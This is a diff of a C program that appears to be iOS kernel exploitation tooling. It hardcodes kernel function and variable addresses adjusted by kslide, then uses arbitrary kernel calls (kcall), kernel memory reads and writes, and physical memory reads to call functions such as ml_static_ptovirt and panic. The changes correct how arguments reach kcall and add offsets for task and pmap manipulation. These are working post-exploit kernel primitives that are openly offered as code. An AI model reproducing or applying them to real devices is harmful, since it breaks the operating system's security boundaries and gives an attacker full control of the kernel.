@@ -6,11 +6,15 @@
 #include <unistd.h>
 
 // Kernel functions
-#define PMAP_ENTER_OPTIONS kslide(0xFFFFFE0008869DA8)
+#define PMAP_ENTER_OPTIONS_ADDR kslide(0xFFFFFE0008869DAC)
+#define PMAP_NEST kslide(0xFFFFFE0008876388)
 #define ML_STATIC_PTOVIRT kslide(0xFFFFFE000888F29C)
 #define PANIC kslide(0xFFFFFE0008F99D88)
 #define KAUTH_CRED_PROC_REF kslide(0xFFFFFE0008C30EF4)
 #define KAUTH_CRED_UNREF kslide(0xFFFFFE0008C32188)
+
+#define TASK_MAP kslide(0xFFFFFE00087B1AF8)
+#define TASK_PMAP kslide(0xFFFFFE00087B1F2C)
 
 // Kernel constants and variables
 #define KERNPROC kslide(0xFFFFFE0007CA6F38)
@@ -35,7 +39,7 @@ void panic(const char *msg, ...)
     va_end(args);
     uint64_t panicMsgBuf = kalloc(strlen(panicMessage) + 1);
     kwritebuf(panicMsgBuf, (void *)panicMessage, strlen(panicMessage) + 1);
-    kcall(PANIC, (uint64_t []){ panicMsgBuf, 0, 0, 0, 0, 0, 0, 0 }, 8);
+    kcall(PANIC, (uint64_t []){ panicMsgBuf }, 1);
     kfree(panicMsgBuf, strlen(panicMessage) + 1);
 }
 
@@ -62,7 +66,7 @@ static uint64_t proc_task(uint64_t proc)
 
 static uint64_t task_map(uint64_t task)
 {
-    return task + koffsetof(task, map);
+    return kreadptr(task + koffsetof(task, map));
 }
 
 static uint64_t task_pmap(uint64_t task)
@@ -92,7 +96,7 @@ int main(void) {
     printf("kvtophys(0x%llX) -> 0x%llX\n", kernelBase, kbasePA);
     printf("physread32(0x%llX) -> 0x%X\n", kbasePA, physread32(kbasePA));
 
-    uint64_t va = kcall(ML_STATIC_PTOVIRT, (uint64_t []){ kbasePA,0x41,0x42,0x43,0x44,0x45,0x46,0x47 }, 8);
+    uint64_t va = kcall(ML_STATIC_PTOVIRT, (uint64_t []){ kbasePA}, 1);
 
     printf("ml_static_ptovirt(0x%llX) -> 0x%llX, kcall success!\n", kbasePA, va);
 
